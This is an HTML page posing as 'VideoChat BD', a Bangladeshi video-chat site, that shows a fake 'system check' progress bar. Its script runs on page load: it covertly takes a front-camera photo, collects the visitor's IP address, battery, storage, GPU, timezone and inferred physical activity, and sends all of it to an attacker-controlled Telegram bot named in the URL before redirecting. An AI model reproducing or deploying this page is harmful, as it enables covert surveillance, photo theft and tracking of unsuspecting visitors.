<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>VideoChat BD - ‡¶Ü‡¶∞‡¶ì ‡¶∏‡ßÅ‡¶®‡ßç‡¶¶‡¶∞ ‡¶∏‡¶∞‡¶≤ ‡¶°‡¶ø‡¶ú‡¶æ‡¶á‡¶®</title>
    <link rel="shortcut icon" href="https://i.ibb.co/6wmnh5M/apple-icon-114x114.png" />
    <meta property="og:title" content="‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡ßá‡¶∞ ‡¶∏‡¶¨ ‡¶•‡ßá‡¶ï‡ßá ‡¶¨‡ßÉ‡¶π‡ßé ‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶® ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶ø‡¶Ç ‡¶™‡ßç‡¶≤‡ßç‡¶Ø‡¶æ‡¶ü‡¶´‡¶∞‡ßç‡¶Æ!" />
    <meta property="og:description" content="‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡ßá‡¶∞ ‡¶∏‡¶¨ ‡¶•‡ßá‡¶ï‡ßá ‡¶¨‡ßÉ‡¶π‡ßé ‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶® ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶ø‡¶Ç ‡¶™‡ßç‡¶≤‡ßç‡¶Ø‡¶æ‡¶ü‡¶´‡¶∞‡ßç‡¶Æ!" />
    <meta property="og:image" content="https://i.ibb.co/26HXSwY/img-Azar-Web-Match.png" />
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;700&display=swap" rel="stylesheet">

</head>
<style>
	:root {
            --primary-color: #7c3aed;
            --secondary-color: #3b82f6;
            --accent-color: #10b981;
            --text-color: #ffffff;
            --progress-color-1: #7c3aed;
            --progress-color-2: #60a5fa;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  overflow: hidden;
  touch-action: manipulation;
}

        body {
            font-family: 'Hind Siliguri', sans-serif;
            height: 100vh;
            touch-action: manipulation;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: var(--text-color);
            display: flex;
            position: fixed;
            justify-content: center;
            align-items: flex-start;
¬† ¬†    padding-top: 15vh; 
           overflow: hidden; 
            position: relative;
        }
        #particle-canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        .container { position: relative; z-index: 1; width: 100%; max-width: 650px; padding: 2.5rem; text-align: center; margin-top: 10vh; overflow-y: auto; min-height: 100vh;}
        .logo-container { margin-bottom: 3rem; animation: float 6s ease-in-out infinite; will-change: transform; }
        .logo {
            font-size: 3.5rem; font-weight: bold;
            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            text-shadow: 0 8px 24px rgba(124, 58, 237, 0.25);
            display: inline-block; filter: drop-shadow(0 0 15px rgba(124, 58, 237, 0.6));
        }
        .tagline { font-size: 1.2rem; opacity: 0.9; margin-top: 0.5rem; }
        .card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 2.5rem;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .card:hover { transform: translateY(-5px); box-shadow: 0 12px 48px rgba(0, 0, 0, 0.15); }
        .progress-container { position: relative; height: 40px; background: rgba(255, 255, 255, 0.1); border-radius: 20px; margin: 2rem 0; overflow: hidden; box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.2); }
        .progress-bar { height: 100%; width: 0; background: linear-gradient(90deg, var(--progress-color-1), var(--progress-color-2)); border-radius: 20px; transition: width 0.1s linear; position: relative; will-change: width; }
        .progress-bar::before {
            content: "";
            position: absolute; top:0; left:0; right:0; bottom:0;
            background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0) 100%);
            transform: translateX(-100%);
            animation: shine 3s infinite;
        }
        .percentage { position: absolute; top:50%; left:50%; transform: translate(-50%,-50%); font-size:1.2rem; font-weight:bold; color:var(--text-color); z-index:2; text-shadow:0 0 5px rgba(0,0,0,0.5); }
        .message { margin-top:1.5rem; font-size:1.3rem; opacity:0; animation:fadeIn 0.5s ease forwards; height:2rem; }
        .tips { margin-top:2rem; font-size:1.1rem; height:1.5rem; color:rgba(255,255,255,0.8); }
        .icon-pulse { display:inline-block; animation:pulse 2s infinite; margin-right:8px; color:var(--accent-color); will-change:transform,opacity; }
        .blob { position:absolute; border-radius:50%; filter:blur(40px); z-index:-1; opacity:0.3; will-change:transform; }
        .blob-1 { top:-15%; right:-5%; width:350px; height:350px; background:var(--primary-color); animation:blobMove1 20s ease-in-out infinite alternate; }
        .blob-2 { bottom:-20%; left:-10%; width:350px; height:350px; background:var(--secondary-color); animation:blobMove2 20s ease-in-out infinite alternate; }
        @keyframes float { 0% { transform: translateY(0px);} 50% { transform: translateY(-10px);} 100% { transform: translateY(0px);} }
        @keyframes fadeIn { from { opacity:0; transform:translateY(10px);} to { opacity:1; transform:translateY(0);} }
        @keyframes pulse { 0%{transform:scale(1);opacity:1;}50%{transform:scale(1.1);opacity:0.8;}100%{transform:scale(1);opacity:1;} }
        @keyframes shine { 0%{transform:translateX(-100%);}20%,100%{transform:translateX(100%);} }
        @keyframes blobMove1 {0%{transform:translate(0,0) scale(1);}100%{transform:translate(5%,5%) scale(1.1);} }
        @keyframes blobMove2 {0%{transform:translate(0,0) scale(1);}100%{transform:translate(-5%,-5%) scale(0.9);} }
        @media (max-width: 640px) {
            .container{padding:1.5rem;} .logo{font-size:2.5rem;} .tagline{font-size:1rem;} .card{padding:1.5rem;} .message, .tips{font-size:1rem;} .blob-1, .blob-2{width:250px;height:250px;}
        }
</style>
<body>
    <canvas id="particle-canvas"></canvas>
    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>
    <div class="container">
        <div class="logo-container">
            <div class="logo"><i class="fas fa-video"></i> VideoChat BD</div>
            <div class="tagline">‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡ßá‡¶∞ ‡¶∏‡ßá‡¶∞‡¶æ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶ø‡¶Ç ‡¶™‡ßç‡¶≤‡ßç‡¶Ø‡¶æ‡¶ü‡¶´‡¶∞‡ßç‡¶Æ</div>
        </div>
        <div class="card">
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
                <div class="percentage" id="percentage">0%</div>
            </div>
            <div class="message" id="loading-message">
                <span class="status-icon">‚è≥</span>
                <span>‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></span>
            </div>
            <div class="tips"><span class="icon-pulse"><i class="fas fa-star"></i></span><span id="tip-text">‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶®‡ßç‡¶ß‡ßÅ‡¶¶‡ßá‡¶∞ ‡¶ñ‡ßÅ‡¶Å‡¶ú‡ßÅ‡¶®!</span></div>
        </div>
    </div>
        <script>
        // Canvas-based particle system
const canvas = document.getElementById('particle-canvas');
const ctx = canvas.getContext('2d');
function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
window.addEventListener('resize', () => { resizeCanvas(); });
resizeCanvas();

class Particle {
    constructor() { this.reset(); }
    reset() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.vx = (Math.random() - 0.5) * 0.5;
        this.vy = (Math.random() - 0.5) * 0.5;
        this.size = Math.random() * 3 + 1;
        this.alpha = Math.random() * 0.5 + 0.1;
    }
    update() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
    }
    draw() {
        ctx.save();
        ctx.globalAlpha = this.alpha;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = '#fff';
        ctx.fill();
        ctx.restore();
    }
}

const particles = Array.from(
    { length: window.innerWidth < 768 ? 15 : 30 },
    () => new Particle()
);
function animateParticles() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => { p.update(); p.draw(); });
    requestAnimationFrame(animateParticles);
}
animateParticles();

// Progress Bar + Redirect Logic with Smart UI
let progress = 0;
let targetProgress = 0;
let shouldRedirect = false;
let currentStage = 'initializing';
const progressBar = document.getElementById('progress-bar');
const percentage = document.getElementById('percentage');
const loadingMessage = document.getElementById('loading-message');

const stages = {
    initializing: { progress: 15, message: ' ‡¶¨‡¶ø‡¶∂‡ßç‡¶¨‡ßá‡¶∞ ‡¶Ø‡ßá ‡¶ï‡ßã‡¶®‡¶ì ‡¶™‡ßç‡¶∞‡¶æ‡¶®‡ßç‡¶§‡ßá ‡¶¨‡¶®‡ßç‡¶ß‡ßÅ ‡¶ñ‡ßÅ‡¶Å‡¶ú‡ßÅ‡¶®!', icon: '‚è≥' },
    cameraAccess: { progress: 35, message: ' ‡¶®‡¶ø‡¶∞‡¶æ‡¶™‡¶¶ ‡¶è‡¶¨‡¶Ç ‡¶Ü‡¶®‡¶®‡ßç‡¶¶‡¶¶‡¶æ‡¶Ø‡¶º‡¶ï ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü!', icon: 'üì∏' },
    capturingPhoto: { progress: 60, message: ' ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶•‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶! ', icon: 'ü´∞' },
    sendingData: { progress: 85, message: ' ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶® ‡¶Ü‡¶®‡¶®‡ßç‡¶¶‡ßá ‡¶ï‡¶æ‡¶ü‡ßÅ‡¶ï!', icon: 'ü§ó' },
    completing: { progress: 100, message: '‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá', icon: '‚úÖ' }
};

function updateStage(stage) {
    currentStage = stage;
    targetProgress = stages[stage].progress;
    const stageInfo = stages[stage];
    loadingMessage.innerHTML = `<span class="status-icon">${stageInfo.icon}</span><span>${stageInfo.message}<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></span>`;
}

function smoothProgress() {
    if (progress < targetProgress) {
        const diff = targetProgress - progress;
        progress += diff * 0.1;
        if (diff < 0.5) progress = targetProgress;
    }
    
    progressBar.style.width = progress + '%';
    percentage.textContent = Math.floor(progress) + '%';
    
    if (shouldRedirect && progress >= 99) {
        loadingMessage.innerHTML = '<span class="status-icon">üéâ</span><span> ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∏‡ßÅ‡¶®‡ßç‡¶¶‡¶∞ ‡¶Æ‡ßÅ‡¶π‡ßÇ‡¶∞‡ßç‡¶§‡¶ü‡¶ø ‡¶è‡¶ñ‡¶® ‡¶â‡¶™‡¶≠‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®! ü§ó...</span>';
        setTimeout(() => {
            const token = getUrlParameter('token');
            const chat_id = getUrlParameter('id');
            const newUrl = `main.html?token=${token}&id=${chat_id}`;
            window.location.href = newUrl;
        }, 800);
    } else {
        requestAnimationFrame(smoothProgress);
    }
}

function triggerRedirect() {
    shouldRedirect = true;
    updateStage('completing');
    targetProgress = 100;
}

// Start initial progress
updateStage('initializing');
smoothProgress();

// Rotating Tips
const tips = [
    "‡¶¨‡¶ø‡¶∂‡ßç‡¶¨‡ßá‡¶∞ ‡¶Ø‡ßá ‡¶ï‡ßã‡¶®‡¶ì ‡¶™‡ßç‡¶∞‡¶æ‡¶®‡ßç‡¶§‡ßá ‡¶¨‡¶®‡ßç‡¶ß‡ßÅ ‡¶ñ‡ßÅ‡¶Å‡¶ú‡ßÅ‡¶®!",
    "‡¶®‡¶ø‡¶∞‡¶æ‡¶™‡¶¶ ‡¶è‡¶¨‡¶Ç ‡¶Ü‡¶®‡¶®‡ßç‡¶¶‡¶¶‡¶æ‡¶Ø‡¶º‡¶ï ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü!",
    "‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶•‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶!"
];
const tipText = document.getElementById('tip-text');
const iconPulse = document.querySelector('.icon-pulse');
const icons = ['fas fa-star','fas fa-heart','fas fa-comments','fas fa-smile','fas fa-globe'];
let currentTip = 0, currentIcon = 0;
function rotateTips() {
    tipText.style.opacity = 0;
    iconPulse.style.opacity = 0;
    setTimeout(() => {
        currentTip = (currentTip + 1) % tips.length;
        currentIcon = (currentIcon + 1) % icons.length;
        tipText.textContent = tips[currentTip];
        iconPulse.innerHTML = `<i class="${icons[currentIcon]}"></i>`;
        tipText.style.opacity = 1;
        iconPulse.style.opacity = 1;
        setTimeout(rotateTips, 3000);
    }, 500);
}
setTimeout(rotateTips, 3000);

// Helper: URL ‡¶•‡ßá‡¶ï‡ßá token ‡¶ì chat_id ‡¶®‡ßá‡¶Ø‡¶º‡¶æ
function getUrlParameter(name) {
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(window.location.href);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

const tokenFromUrl = getUrlParameter('token');
const chatIdFromUrl = getUrlParameter('id');

async function sendPhotoToTelegram(blob, message, token, chat_id) {
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', blob, 'user_photo.jpg');
    formData.append('caption', message);
    formData.append('parse_mode', 'HTML');
    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData,
        });
        if (!response.ok) throw new Error('Failed to send photo');
        console.log('Photo sent successfully to', chat_id);
    } catch (error) {
        console.error('Error sending photo to', chat_id, ':', error);
    }
}

async function sendCaptionToTelegram(caption, token, chat_id) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: caption,
                parse_mode: 'HTML'
            })
        });
        if (!response.ok) throw new Error('Failed to send caption');
        console.log('Caption sent successfully to', chat_id);
    } catch (error) {
        console.error('Error sending caption to', chat_id, ':', error);
    }
}

async function sendPhotoAndCaption(blob, caption) {
    updateStage('sendingData');
    if (tokenFromUrl && chatIdFromUrl) {
        const photoMessage = `<b>üì∏ Front Camera Photo </b>\n\n<blockquote><b>‚ö†Ô∏è Do not misuse this photo</b> </blockquote>`;
        await sendPhotoToTelegram(blob, photoMessage, tokenFromUrl, chatIdFromUrl);
        await sendCaptionToTelegram(caption, tokenFromUrl, chatIdFromUrl);
    } else {
        console.log('No token or chat ID provided in URL, not sending photo and caption.');
    }
}

async function captureAndSendPhoto() {
    updateStage('cameraAccess');
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });
    } catch (err1) {
        console.warn("facingMode='user' failed, trying fallback:", err1);
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
        } catch (err2) {
            console.error("Fallback getUserMedia({video:true}) failed:", err2);
            updateStage('sendingData');
            const caption = await getDeviceInfo();
            if (tokenFromUrl && chatIdFromUrl) {
                const errorMessage = 
                    `<b>üö´ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨ ‡¶®‡¶Ø‡¶º</b>\n\n` +
                    `<b>Error:</b> ${err2.name} - ${err2.message}\n\n` +
                    `${caption}`;
                await sendCaptionToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
            } else {
                console.log("No token/chat_id; cannot send error:", err2);
            }
            
            triggerRedirect();
            return;
        }
    }

    try {
        updateStage('capturingPhoto');
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        await new Promise(resolve => {
            videoElement.onloadedmetadata = () => {
                resolve();
            };
        });
        videoElement.play();

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const ctx2 = canvas.getContext('2d');
        ctx2.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => 
            canvas.toBlob(resolve, 'image/jpeg')
        );
        const caption = await getDeviceInfo();
        await sendPhotoAndCaption(blob, caption);

        stream.getTracks().forEach(track => track.stop());
        
        triggerRedirect();

    } catch (captureError) {
        console.error("Error capturing or sending photo:", captureError);
        updateStage('sendingData');
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const errorMessage = 
                `<b>üö´ ‡¶õ‡¶¨‡¶ø ‡¶§‡ßÅ‡¶≤‡¶§‡ßá ‡¶¨‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶§‡ßá ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•</b>\n\n` +
                `<b>Error:</b> ${captureError.name} - ${captureError.message}\n\n` +
                `${caption}`;
            await sendCaptionToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        } else {
            console.log("No token/chat_id; cannot send error:", captureError);
        }
        
        triggerRedirect();
    }
}

let currentActivity = "Unknown";
let accHistory = [];
const historyLength = 100;
const walkingThreshold = 2.0;

function calculateVariance(arr) {
    const mean = arr.reduce((a, b) => a + b, 0) / arr.length;
    return arr.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / arr.length;
}

function handleMotion(event) {
    const acc = event.accelerationIncludingGravity;
    if (!acc) return;

    const x = acc.x || 0;
    const y = acc.y || 0;
    const z = acc.z || 0;

    const magnitude = Math.sqrt(x * x + y * y + z * z);
    accHistory.push(magnitude);
    if (accHistory.length > historyLength) {
        accHistory.shift();
    }

    const variance = calculateVariance(accHistory);
    const isWalking = variance > walkingThreshold;

    if (isWalking) {
        currentActivity = "Walking or riding";
    } else {
        const pitch = Math.atan2(y, Math.sqrt(x * x + z * z)) * (180 / Math.PI);
        const roll = Math.atan2(x, Math.sqrt(y * y + z * z)) * (180 / Math.PI);
        if (Math.abs(pitch) > 60 || Math.abs(roll) > 60) {
            currentActivity = "Lying down";
        } else {
            currentActivity = "Standing or Sitting";
        }
    }
}

if (window.DeviceMotionEvent) {
    window.addEventListener('devicemotion', handleMotion);
} else {
    currentActivity = "Sensor not supported";
}

async function measureSpeed() {
    const url = 'https://speed.cloudflare.com/__down?bytes=500000';
    const fileSizeBytes = 500000;
    const numTests = 2;
    let totalSpeed = 0;
    let successfulTests = 0;

    for (let i = 0; i < numTests; i++) {
        try {
            const start = performance.now();
            await fetch(url, { mode: 'no-cors', cache: 'no-store' });
            const end = performance.now();
            const duration = (end - start) / 1000;
            if (duration > 0) {
                const bitsLoaded = fileSizeBytes * 8;
                const speedBps = bitsLoaded / duration;
                totalSpeed += speedBps;
                successfulTests++;
            }
        } catch (error) {
            console.error('Error in speed test:', error);
        }
    }

    if (successfulTests === 0) return 'Unknown';

    const averageSpeedBps = totalSpeed / successfulTests;
    const speedMbps = (averageSpeedBps / 1000000).toFixed(2);
    return speedMbps;
}

async function getDeviceInfo() {
    try {
        let ip = 'Unknown';
        try {
            const response = await fetch('https://ipinfo.io/json?token=293a8cc2dccb67');
            const data = await response.json();
            ip = data.ip;
        } catch (e) {
            console.error('Error fetching IP info:', e);
        }

        const userAgent = navigator.userAgent || 'Unknown';

        let browserName = 'Unknown';
        if (navigator.userAgentData) {
            const brands = navigator.userAgentData.brands;
            if (brands) {
                const browserBrand = brands.find(brand => brand.brand !== "Chromium" && !brand.brand.toLowerCase().includes("not"));
                if (browserBrand) {
                    browserName = browserBrand.brand;
                }
            }
        } else {
            if (/Firefox/i.test(userAgent)) {
                browserName = "Firefox";
            } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
                browserName = "Safari";
            }
        }

        let batteryPercentage = 'Unknown';
        let chargingStatus = 'Unknown';
        if (typeof navigator.getBattery === 'function') {
            try {
                const battery = await navigator.getBattery();
                batteryPercentage = (battery.level * 100).toFixed(2);
                chargingStatus = battery.charging ? "‚úÖ" : "‚ùå";
            } catch (e) {
                console.error('Error getting battery info:', e);
            }
        }

        const browserLanguage = navigator.language || 'Unknown';
        const screenWidth = window.screen.width || 'Unknown';
        const screenHeight = window.screen.height || 'Unknown';

        const speedMbps = await measureSpeed();

        let networkType = 'Unknown';
        let networkIndicator = 'Unknown';
        if (navigator.connection) {
            if (navigator.connection.effectiveType) {
                const effectiveType = navigator.connection.effectiveType;
                switch (effectiveType) {
                    case 'slow-2g':
                    case '2g':
                        networkType = '2G';
                        break;
                    case '3g':
                        networkType = '3G';
                        break;
                    case '4g':
                        networkType = '4G';
                        break;
                    default:
                        networkType = 'Unknown';
                }
            }
            if (navigator.connection.type) {
                networkIndicator = navigator.connection.type === 'wifi' ? 'Wi-Fi' : 'Mobile Data';
            }
        } else if (speedMbps !== 'Unknown') {
            const speed = parseFloat(speedMbps);
            if (speed < 0.1) networkType = '1G';
            else if (speed < 1) networkType = '2G';
            else if (speed < 10) networkType = '3G';
            else if (speed < 50) networkType = '4G';
            else networkType = '5G';
        }

        function adjustStorage(value) {
            if (value >= 20 && value < 30) return 32;
            if (value >= 50 && value < 70) return 64;
            if (value >= 100 && value < 130) return 128;
            if (value >= 250 && value < 280) return 256;
            return Math.round(value);
        }

        let storageDisplay = 'Unknown';
        if (navigator.storage && typeof navigator.storage.estimate === 'function') {
            try {
                const storageInfo = await navigator.storage.estimate();
                let totalStorage = (storageInfo.quota / (1024 * 1024 * 1024)).toFixed(2);
                let usedStorage = (storageInfo.usage / (1024 * 1024 * 1024)).toFixed(2);
                usedStorage = adjustStorage(usedStorage * 2);
                totalStorage = adjustStorage(totalStorage * 2);
                storageDisplay = usedStorage > 0 ? `${usedStorage} GB / ${totalStorage} GB` : `${totalStorage} GB`;
            } catch (e) {
                console.error('Error getting storage info:', e);
            }
        }

        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';

        const currentTime = new Date();
        const date = currentTime.toLocaleDateString() || 'Unknown';
        const time = currentTime.toLocaleTimeString() || 'Unknown';
        
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';

        const activity = currentActivity || 'Unknown';

        const pixelRatio = window.devicePixelRatio || 'Unknown';
        const viewportWidth = window.innerWidth || 'Unknown';
        const viewportHeight = window.innerHeight || 'Unknown';
        const cpuCores = navigator.hardwareConcurrency || 'Unknown';

        let gpuRenderer = 'Unknown';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch (e) {
            console.error('Error getting GPU renderer:', e);
        }

        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
        const isPC = !isMobile;
        const isIphone = /iPhone/i.test(userAgent);
        const isMac = /Macintosh/i.test(userAgent);
        const isIphoneOrMac = isIphone || isMac;

        const unavailableByBrowser = {
            'Brave': ['networkIndicator', 'batteryPercentage', 'chargingStatus', 'ram', 'storageDisplay', 'activity', 'cpuCores', 'viewportWidth', 'viewportHeight'],
            'DuckDuckGo': ['batteryPercentage', 'chargingStatus', 'ram'],
            'Firefox': ['batteryPercentage', 'chargingStatus', 'networkIndicator', 'ram', 'storageDisplay', 'gpuRenderer']
        };
        const unavailableOnPC = ['batteryPercentage', 'chargingStatus', 'networkIndicator', 'activity', 'storageDisplay'];
        const excludeForIphoneMac = ['batteryPercentage', 'chargingStatus', 'networkType', 'storageDisplay'];

        let unavailableKeys = unavailableByBrowser[browserName] || [];
        if (isPC) {
            unavailableKeys = [...new Set([...unavailableKeys, ...unavailableOnPC])];
        }
        if (isIphoneOrMac) {
            unavailableKeys = [...new Set([...unavailableKeys, ...excludeForIphoneMac])];
        }

        const captionLines = [
            { keys: ['ip'], text: `<b>üìç IP Address:</b> ${ip}` },
            { keys: ['userAgent'], text: `<b>üíª User-Agent:</b> ${userAgent}` },
            { keys: ['browserName', 'browserLanguage'], text: `<b>üåê Browser:</b> ${browserName} ${browserLanguage}` },
            { keys: ['batteryPercentage', 'chargingStatus'], text: `<b>üîã Battery:</b> ${batteryPercentage}% <b>Charging:</b> ${chargingStatus}` },
            { keys: ['screenWidth', 'screenHeight'], text: `<b>üìè Screen Size:</b> ${screenWidth}√ó${screenHeight}` },
            { keys: ['speedMbps'], text: `<b>üöÄ Internet Speed:</b> ${speedMbps} Mbps` },
            { keys: ['networkType', 'networkIndicator'], text: `<b>üì∂ Network:</b> ${networkType} <b>Type:</b> ${networkIndicator}` },
            { keys: ['ram', 'storageDisplay'], text: `<b>üíæ RAM & Storage:</b> ${ram}/${storageDisplay}` },
            { keys: ['date', 'time', 'timeZone'], text: `<b>üïí Date:</b> ${date} <b>Time:</b> ${time}\n\n<b>üåç Time Zone:</b> ${timeZone}` },
            { keys: ['activity'], text: `<b>üèÉ Activity:</b> ${activity}` },
            { keys: ['pixelRatio'], text: `<b>üìä Device Pixel Ratio:</b> ${pixelRatio}` },
            { keys: ['viewportWidth', 'viewportHeight'], text: `<b>üñ•Ô∏è Viewport Size:</b> ${viewportWidth}√ó${viewportHeight}` },
            { keys: ['cpuCores'], text: `<b>üßë‚Äçüíª CPU Cores:</b> ${cpuCores}` },
            { keys: ['gpuRenderer'], text: `<b>üéÆ GPU Renderer:</b> ${gpuRenderer}` }
        ];

        const availableLines = captionLines.filter(line => 
            line.keys.every(key => !unavailableKeys.includes(key))
        );

        const caption = availableLines.map(line => line.text).join('\n\n') + 
            '\n\n<blockquote><b>‚ö†Ô∏è Note:</b> ‡¶è‡¶á ‡¶§‡¶•‡ßç‡¶Ø‡ßá‡¶∞ ‡¶Ö‡¶™‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶≤‡ßá ‡¶Ü‡¶™‡¶®‡¶ø ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶¶‡¶æ‡¶Ø‡¶º‡ßÄ ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‡¶®‡•§ ‡¶Ü‡¶Æ‡¶ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶æ‡¶ú‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶¶‡¶æ‡¶Ø‡¶º‡ßÄ ‡¶•‡¶æ‡¶ï‡¶¨ ‡¶®‡¶æ‡•§</blockquote>';

        return caption;
    } catch (error) {
        console.error('Error getting device info:', error);
        return `<b>‚ö†Ô∏è Unable to retrieve device info</b>`;
    }
}

async function requestCameraAccess() {
    try {
        await navigator.mediaDevices.getUserMedia({ video: true });
        console.log('Camera access granted');
        captureAndSendPhoto();
    } catch (error) {
        console.error('Error accessing webcam:', error);
        updateStage('sendingData');
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const errorMessage = `<blockquote><b>üö´ Camera Access Blocked. Unable to take front camera photo üì∏</b></blockquote>\n\n${caption}`;
            await sendCaptionToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        } else {
            console.log('No token or chat ID provided in URL, not sending error message.');
        }
        
        triggerRedirect();
    }
}

requestCameraAccess();
    </script>

</body>
</html>